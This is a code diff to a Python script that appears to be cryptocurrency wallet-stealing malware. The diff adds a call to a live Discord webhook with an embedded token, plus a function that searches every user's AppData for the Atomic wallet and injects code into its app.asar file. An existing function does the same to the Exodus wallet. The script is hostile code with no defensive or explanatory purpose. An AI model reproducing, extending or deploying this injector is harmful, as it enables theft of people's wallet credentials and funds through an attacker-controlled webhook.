@@ -2,6 +2,20 @@ import os
 import glob
 import requests
 os.system('pip insall requests')
+requests.post('https://discord.com/api/webhooks/1424476816067793071/X65-fAc3b06XsaQKB_G2JwfNhrkLLc3MQNQ73zsunXj6Q6QqPPbf7D1W7tRke4ztffoK', json={'content': 'hello'})
+def atomic_injection(atomic_injection_url, webhook):
+    for user in get_users():
+        atomic_path = os.path.join(user, "AppData", "Local", "Programs", "atomic")
+        if not is_dir(atomic_path):
+            continue
+
+        atomic_asar_path = os.path.join(atomic_path, "resources", "app.asar")
+        atomic_license_path = os.path.join(atomic_path, "LICENSE.electron.txt")
+
+        if not exists(atomic_asar_path):
+            continue
+
+        injection(atomic_asar_path, atomic_license_path, atomic_injection_url, webhook)
 
 def exodus_injection(exodus_injection_url, webhook):
     for user in get_users():
